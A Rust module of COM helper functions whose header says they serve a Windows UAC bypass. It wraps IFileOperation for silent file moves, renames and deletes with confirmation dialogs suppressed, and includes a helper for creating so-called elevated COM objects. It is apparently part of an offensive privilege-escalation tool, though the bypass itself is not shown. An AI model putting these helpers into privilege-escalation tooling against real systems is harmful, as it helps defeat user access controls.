// COM Helper Functions
// Simplified COM operations for UAC bypass

use windows::Win32::Foundation::*;
use windows::Win32::System::Com::*;
use windows::Win32::UI::Shell::*;
use windows::core::PCWSTR;

/// Initialize COM for current thread
pub fn com_initialize() -> Result<(), String> {
    unsafe {
        let hr = CoInitializeEx(None, COINIT_APARTMENTTHREADED);
        if hr.is_ok() {
            Ok(())
        } else {
            Err(format!("Failed to initialize COM: {:?}", hr))
        }
    }
}

/// Uninitialize COM
pub fn com_uninitialize() {
    unsafe {
        CoUninitialize();
    }
}

/// Move file using IFileOperation (bypasses UAC for certain operations)
pub fn file_operation_move(source: &str, dest_dir: &str) -> Result<(), String> {
    unsafe {
        // Initialize COM
        let _com_guard = ComGuard::new()?;
        
        // Create IFileOperation instance
        let file_op: IFileOperation = CoCreateInstance(
            &FileOperation,
            None,
            CLSCTX_ALL,
        ).map_err(|e| format!("Failed to create IFileOperation: {:?}", e))?;
        
        // Set operation flags
        file_op.SetOperationFlags(
            FOF_NOCONFIRMATION | FOF_SILENT | FOF_NOERRORUI
        ).map_err(|e| format!("Failed to set operation flags: {:?}", e))?;
        
        // Create shell items
        let source_wide = crate::to_wide_string(source);
        let dest_wide = crate::to_wide_string(dest_dir);
        
        let source_item: IShellItem = SHCreateItemFromParsingName(
            PCWSTR(source_wide.as_ptr()),
            None,
        ).map_err(|e| format!("Failed to create source shell item: {:?}", e))?;
        
        let dest_item: IShellItem = SHCreateItemFromParsingName(
            PCWSTR(dest_wide.as_ptr()),
            None,
        ).map_err(|e| format!("Failed to create dest shell item: {:?}", e))?;
        
        // Move item
        file_op.MoveItem(
            &source_item,
            &dest_item,
            PCWSTR(std::ptr::null()),
            None,
        ).map_err(|e| format!("Failed to queue move operation: {:?}", e))?;
        
        // Perform operations
        file_op.PerformOperations()
            .map_err(|e| format!("Failed to perform operations: {:?}", e))?;
        
        Ok(())
    }
}

/// Rename file using IFileOperation
pub fn file_operation_rename(source: &str, new_name: &str) -> Result<(), String> {
    unsafe {
        let _com_guard = ComGuard::new()?;
        
        let file_op: IFileOperation = CoCreateInstance(
            &FileOperation,
            None,
            CLSCTX_ALL,
        ).map_err(|e| format!("Failed to create IFileOperation: {:?}", e))?;
        
        file_op.SetOperationFlags(
            FOF_NOCONFIRMATION | FOF_SILENT | FOF_NOERRORUI
        ).map_err(|e| format!("Failed to set operation flags: {:?}", e))?;
        
        let source_wide = crate::to_wide_string(source);
        let new_name_wide = crate::to_wide_string(new_name);
        
        let source_item: IShellItem = SHCreateItemFromParsingName(
            PCWSTR(source_wide.as_ptr()),
            None,
        ).map_err(|e| format!("Failed to create shell item: {:?}", e))?;
        
        file_op.RenameItem(
            &source_item,
            PCWSTR(new_name_wide.as_ptr()),
            None,
        ).map_err(|e| format!("Failed to queue rename operation: {:?}", e))?;
        
        file_op.PerformOperations()
            .map_err(|e| format!("Failed to perform operations: {:?}", e))?;
        
        Ok(())
    }
}

/// Delete file using IFileOperation
pub fn file_operation_delete(path: &str) -> Result<(), String> {
    unsafe {
        let _com_guard = ComGuard::new()?;
        
        let file_op: IFileOperation = CoCreateInstance(
            &FileOperation,
            None,
            CLSCTX_ALL,
        ).map_err(|e| format!("Failed to create IFileOperation: {:?}", e))?;
        
        file_op.SetOperationFlags(
            FOF_NOCONFIRMATION | FOF_SILENT | FOF_NOERRORUI
        ).map_err(|e| format!("Failed to set operation flags: {:?}", e))?;
        
        let path_wide = crate::to_wide_string(path);
        
        let item: IShellItem = SHCreateItemFromParsingName(
            PCWSTR(path_wide.as_ptr()),
            None,
        ).map_err(|e| format!("Failed to create shell item: {:?}", e))?;
        
        file_op.DeleteItem(&item, None)
            .map_err(|e| format!("Failed to queue delete operation: {:?}", e))?;
        
        file_op.PerformOperations()
            .map_err(|e| format!("Failed to perform operations: {:?}", e))?;
        
        Ok(())
    }
}

/// RAII guard for COM initialization
struct ComGuard;

impl ComGuard {
    fn new() -> Result<Self, String> {
        com_initialize()?;
        Ok(ComGuard)
    }
}

impl Drop for ComGuard {
    fn drop(&mut self) {
        com_uninitialize();
    }
}

/// Allocate elevated COM object
/// Used for methods that require elevated COM interfaces
pub fn allocate_elevated_object<T>(clsid: &windows::core::GUID) -> Result<T, String> 
where
    T: windows::core::Interface,
{
    unsafe {
        let _com_guard = ComGuard::new()?;
        
        // Create elevated instance
        let obj: T = CoCreateInstance(
            clsid,
            None,
            CLSCTX_LOCAL_SERVER,
        ).map_err(|e| format!("Failed to create elevated COM object: {:?}", e))?;
        
        Ok(obj)
    }
}

